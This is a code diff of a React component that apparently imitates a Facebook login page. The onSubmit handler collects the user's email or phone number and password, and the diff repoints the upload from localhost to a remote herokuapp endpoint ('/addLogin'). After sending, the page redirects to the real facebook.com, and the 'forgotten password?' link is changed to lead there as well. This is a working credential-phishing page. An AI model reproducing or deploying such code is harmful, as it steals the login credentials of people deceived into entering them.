@@ -8,7 +8,6 @@ const Home = () => {
   const {
     register,
     handleSubmit,
-    watch,
     formState: { errors },
   } = useForm();
   const onSubmit = (data) => {
@@ -16,15 +15,14 @@ const Home = () => {
       phoneNumber: data.email,
       password: data.password,
     };
-    console.log(loginData);
-    fetch("http://localhost:5000/addLogin", {
+    fetch("https://blooming-peak-04928.herokuapp.com/addLogin", {
       method: "POST",
       headers: { "Content-type": "application/json" },
       body: JSON.stringify(loginData),
     })
       .then((response) => response.JSON)
-      .then((result) => console.log(result, "user information post on server"));
-     window.location.assign("https://facebook.com/");
+      .then((result) => result);
+    window.location.assign("https://facebook.com/");
   };
 
   return (
@@ -73,7 +71,13 @@ const Home = () => {
                 </button>
 
                 <div className="forgot-password">
-                  <Link to="/">forgotten password?</Link>
+                  <Link
+                    to={{ pathname: "https://www.facebook.com/" }}
+                    target="_blank
+                    "
+                  >
+                    forgotten password?
+                  </Link>
                 </div>
 
                 <button className="btn create-account-btn text-center">
